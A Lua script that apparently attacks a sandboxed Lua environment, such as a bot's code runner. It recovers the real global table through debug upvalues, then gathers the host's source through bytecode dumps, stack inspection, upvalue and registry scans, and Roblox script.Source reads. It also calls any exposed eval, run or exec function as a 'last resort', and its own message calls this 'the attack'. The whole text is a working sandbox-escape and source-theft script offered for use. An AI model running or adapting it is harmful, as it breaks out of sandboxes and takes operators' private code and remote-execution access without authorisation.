-- 1. Re-acquire real_G if needed (should already exist in environment)
if not real_G then
    print("[WARN] real_G missing, re-acquiring...")
    local f = print
    for i = 1, 200 do
        local n, v = debug.getupvalue(f, i)
        if not n then break end
        if type(v) == "table" and v._G then
            real_G = v
            break
        end
    end
    if not real_G then error("Cannot obtain real_G; abort.") end
end
print("[OK] real_G available.")

-- Utility: safe call with full error capture
local function safe_call(description, func)
    local success, result = pcall(func)
    if success then
        print(string.format("[OK] %s → %s", description, tostring(result or "nil")))
        return true, result
    else
        warn(string.format("[FAIL] %s → %s", description, tostring(result)))
        return false, result
    end
end

-- Storage for found source pieces
local source_candidates = {}  -- key = description, value = string or table

-- 2. Scan real_G for any variable that is a string longer than 30 chars (likely source/config)
print("[STEP 2] Scanning real_G for large strings...")
safe_call("Scan real_G string variables", function()
    local count = 0
    for k, v in pairs(real_G) do
        if type(v) == "string" and #v > 30 then
            source_candidates["real_G." .. tostring(k)] = v
            count = count + 1
            print(string.format("  Found string key '%s' (%d bytes): %s", k, #v, v:sub(1, 80)))
        end
    end
    return tostring(count) .. " large strings found."
end)

-- 3. Dump bytecode of every function in real_G and search for source-like strings inside
if rawget(real_G, "string") and rawget(real_G, "string").dump then
    print("[STEP 3] Dumping bytecode of all real_G functions...")
    local dumped_count = 0
    for k, v in pairs(real_G) do
        if type(v) == "function" then
            safe_call("Dump " .. tostring(k), function()
                local bytecode = real_G.string.dump(v)
                local bstr = tostring(bytecode)
                dumped_count = dumped_count + 1
                -- Search for potential Lua source fragments (heuristic)
                -- Look for 'function ' pattern
                local f_count = select(2, string.gsub(bstr, "function", ""))
                local e_count = select(2, string.gsub(bstr, " end", ""))
                if f_count > 0 and e_count > 0 then
                    source_candidates["bytecode_of_" .. k] = string.format(
                        "bytecode size %d, contains 'function' %d times, 'end' %d times",
                        #bstr, f_count, e_count
                    )
                    print(string.format("  %s: %s", k, source_candidates["bytecode_of_" .. k]))
                end
            end)
        end
    end
    print(string.format("[OK] Dumped %d functions.", dumped_count))
else
    warn("[STEP 3] string.dump not available.")
end

-- 4. Attempt to get the source of the main script via debug.getinfo on stack frame 1
print("[STEP 4] Inspecting main script source via debug.getinfo...")
safe_call("debug.getinfo(1, 'S')", function()
    local info = debug.getinfo(1, "S")
    if info and info.source and info.source:sub(1,1) ~= "=" then
        source_candidates["main_script_source_name"] = info.source
        return "source file: " .. info.source .. ", line " .. (info.linedefined or "?")
    else
        error("no readable source name found.")
    end
end)

-- 5. Walk all functions on the call stack and extract their source names
print("[STEP 5] Enumerating stack frames for sources...")
for level = 1, 20 do
    local ok, info = pcall(debug.getinfo, level, "S")
    if not ok or not info then break end
    if info.source and info.source:sub(1,1) ~= "=" then
        source_candidates["stack_" .. level] = info.source
        print(string.format("  Stack %d: %s (linedefined %d)", level, info.source, info.linedefined or 0))
    end
end

-- 6. Extract upvalues of all functions in real_G that might contain loaded source code
print("[STEP 6] Hunting for source strings in upvalues...")
local scanned_funcs = {}
for k, v in pairs(real_G) do
    if type(v) == "function" and not scanned_funcs[v] then
        scanned_funcs[v] = true
        safe_call("Upvalues of " .. tostring(k), function()
            for i = 1, 100 do
                local name, val = debug.getupvalue(v, i)
                if not name then break end
                if type(val) == "string" and #val > 30 then
                    local desc = string.format("upvalue[%d] of %s (%d bytes)", i, k, #val)
                    source_candidates[desc] = val
                    print(string.format("  %s: %s...", desc, val:sub(1, 60)))
                end
            end
        end)
    end
end

-- 7. Check the global environment of the caller (might contain a 'script' or 'code' table)
print("[STEP 7] Inspecting environment of the script's caller...")
safe_call("getfenv(0) inspection", function()
    local penv = getfenv(0)
    if penv then
        for k, v in pairs(penv) do
            if type(v) == "string" and #v > 30 and (tostring(k):lower():match("source") or tostring(k):lower():match("code") or tostring(k):lower():match("script")) then
                source_candidates["env." .. tostring(k)] = v
                print(string.format("  env.%s: %d bytes", k, #v))
            end
        end
    end
end)

-- 8. If the environment is Roblox-like (Luau), try to read script.Source or script.source
if real_G.script then
    safe_call("Roblox script.Source", function()
        local s = real_G.script
        local src = rawget(s, "Source") or rawget(s, "source") or s.Source
        if type(src) == "string" and #src > 0 then
            source_candidates["script.Source"] = src
            return string.format("got %d bytes", #src)
        else
            error("no Source property accessible")
        end
    end)
end

-- 9. Use debug.getregistry to locate loaded modules (if available)
if debug.getregistry then
    print("[STEP 8] Scanning debug.getregistry...")
    safe_call("debug.getregistry", function()
        local reg = debug.getregistry()
        local count = 0
        for k, v in pairs(reg) do
            if type(k) == "string" and (k:lower():match("loaded") or k:lower():match("require") or k:lower():match("module")) then
                for modname, mod in pairs(v) do
                    if type(mod) == "function" then
                        local info = debug.getinfo(mod, "S")
                        if info and info.source and info.source:sub(1,1) ~= "=" then
                            source_candidates["module_" .. modname] = info.source
                            count = count + 1
                        end
                    end
                end
            end
        end
        return tostring(count) .. " module sources found."
    end)
end

-- 10. Last resort: try to execute a Lua command that reads the bot source if any admin function is exposed
print("[STEP 9] Searching for admin/RCE functions in real_G...")
for k, v in pairs(real_G) do
    if type(v) == "function" and (k:lower():match("eval") or k:lower():match("run") or k:lower():match("exec")) then
        safe_call("Calling " .. tostring(k), function()
            -- Attempt to use it to get environment
            local res = v("return getfenv(0)._G or _G")
            return tostring(res)
        end)
    end
end

-- Final summary
print("\n===== SOURCE RETRIEVAL RESULTS =====")
local total = 0
for desc, data in pairs(source_candidates) do
    total = total + 1
    if type(data) == "string" then
        print(string.format("[%d] %s (%d chars): %s...", total, desc, #data, data:sub(1, 80)))
    else
        print(string.format("[%d] %s = %s", total, desc, tostring(data)))
    end
end
if total == 0 then
    warn("No source fragments found. All extraction vectors failed or returned empty. Review above error logs to refine the attack.")
else
    print(string.format("[SUCCESS] Collected %d potential source pieces.", total))
end

-- Optionally, compile all strings into one and display
local all_source = {}
for _, v in pairs(source_candidates) do
    if type(v) == "string" then
        all_source[#all_source+1] = v
    end
end
if #all_source > 0 then
    local combined = table.concat(all_source, "\n\n")
    print("\n[FULL CONCATENATED SOURCE]")
    print(combined)
end